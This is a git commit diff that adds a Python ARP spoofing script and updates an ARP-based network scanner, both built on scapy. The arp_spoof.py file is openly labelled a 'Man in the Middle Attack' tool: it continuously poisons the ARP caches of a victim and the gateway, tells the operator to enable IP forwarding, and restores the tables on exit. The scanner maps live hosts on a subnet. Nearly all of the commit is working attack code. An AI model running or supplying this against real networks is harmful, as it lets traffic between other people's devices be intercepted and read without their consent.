84d7e019f91253d8619aa50b3665cf4adb73cb4f
gemstone-source <sophiajulius5@gmail.com>
2023-03-29 23:10:52 +0300

    adding arp spoofing and network scanner

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,3 +1,54 @@
-import scapy.all as scapy
+#!/usr/bin/env python3
+# Author Gemstone HashGhost
 
-packet = scapy.ARP(op=2, pdst="192.168.43.75", hwdst="fe80::a997:b298:85ac:cb12", psrc="192.168.43.1")
+import scapy.all as scapy 
+import sys,time
+def get_mac(ip):
+    ''' The first ARP will asks for only 0.0.0.0 but no specific ip'''
+    # scapy.ls(scapy.ARP())
+    # arp_request = scapy.ARP()
+    # print(arp_request.summary())
+
+    arp_request = scapy.ARP(pdst=ip) # Obtain the specific ip, "Who has this ip"
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Setting Broadcast MAC 
+    arp_request_broadcast = broadcast/arp_request     # Generation new frame by combining both ip and mac
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answered_list[0][1].hwsrc
+
+'''
+This program performs Man in the Middle Attack, all the dst fields get victim details and src field gets the fetch detail,
+Just provide two args like ./arpspoof.py 172.16.34.129 172.16.34.2
+'''
+def spoof(victim_ip, router_ip):
+    target_mac = get_mac(router_ip)
+    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac, psrc=router_ip)
+    scapy.send(packet, verbose=False)
+
+def restore(og_source_ip, og_destination_ip):
+    source_mac = get_mac(og_source_ip)
+    destination_mac = get_mac(og_destination_ip)
+    packet = scapy.ARP(op=2, pdst=og_destination_ip, hwdst=destination_mac, psrc=og_source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+'''
+The loop will make the response to persist without terminating and keep spoofing continuosly
+Remember to add cho 1> /proc/sys/net/ipv4/ip_forward to your Linux Machine to allow ip forwarding
+'''
+
+# Vaiables for targets
+target_ip = sys.argv[1]
+gateway_ip = sys.argv[2]
+
+try:
+    packet_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        packet_count = packet_count + 2
+        print("\r[+] Packet Sent : " + str(packet_count), end="")
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("\n[-] Keyboard Interrupt, CTRL + C Quitting... Wait a little")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
--- network_scanner.py
+++ network_scanner.py
@@ -1,8 +1,9 @@
-#!/usr/bin/env pyhon3
+#!/usr/bin/env python3
 # Author Gemstone Hashghost
 # Network Scanner
 
 import scapy.all as scapy
+import sys
 
 def scan(ip):
     ''' The first ARP will asks for only 0.0.0.0 but no specific ip'''
@@ -11,7 +12,7 @@ def scan(ip):
     # print(arp_request.summary())
 
     arp_request = scapy.ARP(pdst=ip) # Obtain the specific ip, "Who has this ip"
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Setting Broadcast MAC 
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Setting Broadcast MAC 
     arp_request_broadcast = broadcast/arp_request     # Generation new frame by combining both ip and mac
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
@@ -27,5 +28,5 @@ def print_result(result_list):
         print(client["ip"] +"\t\t"+ client["mac"])
 
 
-scan_result = scan("192.168.43.1/24")
+scan_result = scan(sys.argv[1])
 print_result(scan_result)
